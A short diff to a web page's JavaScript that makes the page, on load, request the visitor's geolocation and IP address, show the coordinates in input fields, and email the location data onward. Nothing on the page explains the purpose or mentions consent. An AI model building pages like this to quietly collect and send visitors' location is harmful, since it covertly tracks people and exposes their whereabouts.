@@ -74,6 +74,12 @@
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const ipAddress = await getIP();
                     const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
+
+                    // Set latitude and longitude in the input fields
+                    document.getElementById("latitude").value = position.coords.latitude;
+                    document.getElementById("longitude").value = position.coords.longitude;
+
+                    // Send email with location data
                     sendEmail(position, ipAddress, locationData);
                 }, (error) => {
                     alert("Unable to retrieve your location. Please check your settings.");
@@ -115,6 +121,7 @@
             });
         }
 
+        // Call getLocation on page load to fetch location and display in inputs
         getLocation();
     </script>
 </body>
